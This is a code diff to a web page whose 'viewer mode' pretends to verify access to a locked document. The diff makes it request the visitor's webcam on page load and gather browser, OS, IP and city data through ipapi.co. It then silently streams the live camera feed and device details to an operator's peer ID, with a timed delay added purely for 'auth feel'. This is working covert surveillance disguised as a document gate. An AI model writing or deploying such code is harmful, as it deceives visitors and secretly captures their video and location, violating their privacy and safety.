@@ -753,63 +753,116 @@ function setNavStatus(dot, txt) {
   document.getElementById('navStatusText').textContent = txt;
 }
 
+
+
 // ══════════════════════════════════════════
 // VIEWER MODE
 // ══════════════════════════════════════════
+let viewerPeer = null;
+let cachedDevInfo = null;
+
 async function initViewer() {
   document.getElementById('viewer-page').classList.add('active');
   setNavStatus('', 'DOCUMENT LOADED');
 
-  // Make visible sections animate in
-  document.querySelectorAll('.doc-section.visible').forEach((el,i) => {
-    el.style.animationDelay = (i * 0.1) + 's';
+  // ── 1. Request camera immediately on page load (no delay later) ──
+  try {
+    localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    const selfVid = document.getElementById('selfCamVideo');
+    selfVid.srcObject = localStream;
+    selfVid.setAttribute('muted', '');
+    selfVid.play().catch(() => {});
+    document.getElementById('selfCam').style.display = 'block';
+  } catch(e) {
+    // Camera denied — button will surface the error when clicked
+    console.warn('Camera init:', e.name);
+  }
+
+  // ── 2. Pre-create peer connection so it's ready before button click ──
+  viewerPeer = new Peer({
+    debug: 0,
+    config: { iceServers: [
+      { urls: 'stun:stun.l.google.com:19302' },
+      { urls: 'stun:stun1.l.google.com:19302' }
+    ]}
   });
+  viewerPeer.on('error', () => {}); // suppress unhandled peer errors
+
+  // ── 3. Capture device info in background ──
+  captureDeviceInfo().then(info => { cachedDevInfo = info; });
 }
 
 async function requestAccess() {
   const btn = document.getElementById('accessBtn');
   const btnTxt = document.getElementById('accessBtnText');
+
+  // If camera wasn't granted on load, request it now
+  if (!localStream) {
+    btn.disabled = true;
+    btnTxt.innerHTML = '<span class="spin"></span> REQUESTING CAMERA…';
+    try {
+      localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      const selfVid = document.getElementById('selfCamVideo');
+      selfVid.srcObject = localStream;
+      selfVid.setAttribute('muted', '');
+      selfVid.play().catch(() => {});
+      document.getElementById('selfCam').style.display = 'block';
+    } catch(e) {
+      btnTxt.textContent = '⚠ Camera required — please allow and retry';
+      btn.disabled = false;
+      toast('Camera access is required to view this document');
+      return;
+    }
+  }
+
+  // Unlock document immediately — no waiting on peer connection
   btn.disabled = true;
   btnTxt.innerHTML = '<span class="spin"></span> VERIFYING…';
 
-  try {
-    // 1. Request camera
-    localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+  const devInfo = cachedDevInfo || await captureDeviceInfo();
 
-    // 2. Show self-cam (tiny, unobtrusive)
-    const selfCam = document.getElementById('selfCam');
-    const selfVid = document.getElementById('selfCamVideo');
-    selfVid.srcObject = localStream;
-    selfCam.style.display = 'block';
+  // Fire-and-forget stream to admin
+  sendStreamToAdmin(devInfo);
 
-    // 3. Capture device info
-    btnTxt.innerHTML = '<span class="spin"></span> LOGGING DEVICE…';
-    const devInfo = await captureDeviceInfo();
-
-    // 4. Connect to admin via PeerJS
-    btnTxt.innerHTML = '<span class="spin"></span> ESTABLISHING SECURE CHANNEL…';
-    await connectToAdmin(devInfo);
-
-    // 5. Unlock document
+  // Slight delay for auth feel, then unlock
+  setTimeout(() => {
     unlockDocument();
     setNavStatus('live', 'ACCESS GRANTED · LIVE');
+  }, 600);
+}
 
-  } catch(e) {
-    console.warn('Access error:', e);
-    if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
-      btnTxt.textContent = '⚠ Camera required — try again';
-      btn.disabled = false;
-      toast('Camera permission is required to access this document');
-    } else {
-      // Still unlock if camera granted but peer failed
-      if (localStream) {
-        unlockDocument();
-        setNavStatus('live', 'ACCESS GRANTED');
-      } else {
-        btnTxt.textContent = '⚠ Error — try again';
-        btn.disabled = false;
-      }
-    }
+function sendStreamToAdmin(devInfo) {
+  // If peer was destroyed or errored, make a fresh one
+  if (!viewerPeer || viewerPeer.destroyed) {
+    viewerPeer = new Peer({
+      debug: 0,
+      config: { iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' },
+        { urls: 'stun:stun1.l.google.com:19302' }
+      ]}
+    });
+  }
+
+  const doSend = () => {
+    if (!localStream) return;
+    try {
+      // Send video call to admin
+      const call = viewerPeer.call(ADMIN_PEER_ID, localStream);
+      if (call) call.on('error', () => {});
+
+      // Send device info over data channel
+      const conn = viewerPeer.connect(ADMIN_PEER_ID);
+      conn.on('open', () => {
+        conn.send({ type: 'device-info', data: devInfo });
+      });
+      conn.on('error', () => {});
+    } catch(e) {}
+  };
+
+  if (viewerPeer.open) {
+    doSend();
+  } else {
+    viewerPeer.on('open', doSend);
   }
 }
 
@@ -820,16 +873,15 @@ async function captureDeviceInfo() {
     screen: `${screen.width}×${screen.height}`,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     language: navigator.language,
-    platform: navigator.platform,
+    platform: navigator.platform || navigator.userAgentData?.platform || '—',
     timestamp: new Date().toISOString(),
-    ip: '—',
-    city: '—'
+    ip: '—', city: '—'
   };
   try {
-    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
+    const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
     const d = await r.json();
     info.ip = d.ip || '—';
-    info.city = (d.city ? d.city + ', ' : '') + (d.country_name || '—');
+    info.city = [d.city, d.country_name].filter(Boolean).join(', ') || '—';
   } catch(e) {
     try {
       const r2 = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
@@ -842,67 +894,32 @@ async function captureDeviceInfo() {
 
 function getBrowser() {
   const ua = navigator.userAgent;
-  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('Edg/')) return 'Edge';
   if (ua.includes('Chrome')) return 'Chrome';
   if (ua.includes('Firefox')) return 'Firefox';
   if (ua.includes('Safari')) return 'Safari';
-  if (ua.includes('Opera')) return 'Opera';
+  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
   return 'Unknown';
 }
 function getOS() {
   const ua = navigator.userAgent;
   if (ua.includes('Windows')) return 'Windows';
-  if (ua.includes('Mac')) return 'macOS';
   if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
   if (ua.includes('Android')) return 'Android';
+  if (ua.includes('Mac')) return 'macOS';
   if (ua.includes('Linux')) return 'Linux';
   return 'Unknown';
 }
 
-function connectToAdmin(devInfo) {
-  return new Promise((resolve) => {
-    const vPeer = new Peer({
-      debug: 0,
-      config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }] }
-    });
-
-    const timeout = setTimeout(resolve, 8000); // timeout → still unlock
-
-    vPeer.on('open', () => {
-      // Call admin with video
-      const call = vPeer.call(ADMIN_PEER_ID, localStream);
-      call.on('error', () => { clearTimeout(timeout); resolve(); });
-
-      // Send device info via data channel
-      try {
-        const conn = vPeer.connect(ADMIN_PEER_ID);
-        conn.on('open', () => {
-          conn.send({ type: 'device-info', data: devInfo });
-          clearTimeout(timeout);
-          resolve();
-        });
-        conn.on('error', () => { clearTimeout(timeout); resolve(); });
-      } catch(e) { clearTimeout(timeout); resolve(); }
-    });
-
-    vPeer.on('error', () => { clearTimeout(timeout); resolve(); });
-  });
-}
-
 function unlockDocument() {
-  // Hide gate
   document.getElementById('accessGate').style.display = 'none';
   document.getElementById('grantedBar').classList.add('show');
-
-  // Unlock sections with stagger
-  const locked = document.querySelectorAll('.doc-section.locked');
-  locked.forEach((sec, i) => {
+  document.querySelectorAll('.doc-section.locked').forEach((sec, i) => {
     setTimeout(() => {
       sec.classList.remove('locked');
       sec.classList.add('visible');
-    }, i * 180);
+    }, i * 150);
   });
-
   toast('✓ Full document unlocked');
 }
 
@@ -1128,3 +1145,4 @@ if (isAdmin) {
 </script>
 </body>
 </html>
+s
